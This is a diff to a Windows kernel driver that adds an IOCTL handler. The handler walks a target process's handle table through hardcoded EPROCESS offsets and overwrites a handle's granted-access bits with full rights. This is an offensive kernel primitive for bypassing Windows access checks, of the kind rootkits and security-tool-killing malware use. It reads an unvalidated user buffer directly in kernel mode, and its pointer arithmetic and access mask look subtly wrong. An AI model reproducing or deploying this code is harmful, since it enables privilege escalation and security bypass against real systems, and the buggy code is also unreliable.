@@ -339,6 +339,61 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 
 		break;
 	}
+	case IOCTL_SET_FULL_PRIVS_ON_KERNEL_OBJECT:
+	{
+		PTARGET_HANDLE handle = (PTARGET_HANDLE)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+		PEPROCESS eProcess;
+		status = PsLookupProcessByProcessId((HANDLE)handle->ProcessId, &eProcess);
+		DbgPrint("eProcess: 0x%p\n", eProcess);
+		//TODO: obtain offsets in generic way
+		DWORD64 * handleTable = (DWORD64 *)((UCHAR*)eProcess + 0x300); //ObjectTable for Build 10.0.26200
+		//GetHandleTable
+		DbgPrint("handleTable: 0x%p\n", * handleTable);
+		//GetTableCode
+		DWORD64 * tableCode = (DWORD64*)((UCHAR*)*handleTable + 0x08); //costant after windows 8
+		DbgPrint("tableCode: 0x%p\n", * tableCode);
+		//GetHandleTableEntry
+		DWORD32 TableLevel = (DWORD32)(*tableCode & 3);
+		DbgPrint("tableLevel: 0x%x\n", TableLevel);
+		
+		DWORD64* HandleEntryAddress = 0;
+		DWORD64 * t1, * t2; 
+		switch (TableLevel) 
+		{
+			case 0:
+			{
+				HandleEntryAddress = (DWORD64 *)(tableCode + 4 * handle->handle);
+				DbgPrint("Level 0: 0x%p\n", HandleEntryAddress);
+				break;
+			}
+			case 1:
+			{
+				t1 = (DWORD64*)(*tableCode + 8 * (handle->handle >> 10) - 1);
+				DbgPrint("t1: 0x%p\n", *t1);
+				HandleEntryAddress = (DWORD64 *)(*t1 + 4 * (handle->handle & 0x3ff));
+				DbgPrint("Level 1: 0x%p\n", HandleEntryAddress);
+				break;
+			}
+			case 2:
+			{
+				t2 = (DWORD64*)(tableCode + 8 * (handle->handle >> 19) - 2);
+				t1 = (DWORD64*)(*t2 + 8 * ((handle->handle >> 10) & 0x1ff));
+				HandleEntryAddress = (DWORD64*)(*t1 + 4 * (handle->handle & 0x3ff));
+				DbgPrint("Level 2: 0x%p\n", HandleEntryAddress);
+				break;
+			}
+			default:
+			{
+				HandleEntryAddress = 0; 
+			}
+		}
+		//Set privs to HandleEntryAddress + 0x8 = 0x1fffff (HANDLE_FULL_PRIVS)
+		DWORD64* GrantedAccessBits = (DWORD64*)((UCHAR *)HandleEntryAddress + 0x08);
+		*GrantedAccessBits = 0x1ffffff;
+		DbgPrint("GrantedAccessBits: 0x%x\n", *GrantedAccessBits);
+
+		break;
+	}
 	default:
 	{
 		status = STATUS_INVALID_DEVICE_REQUEST;
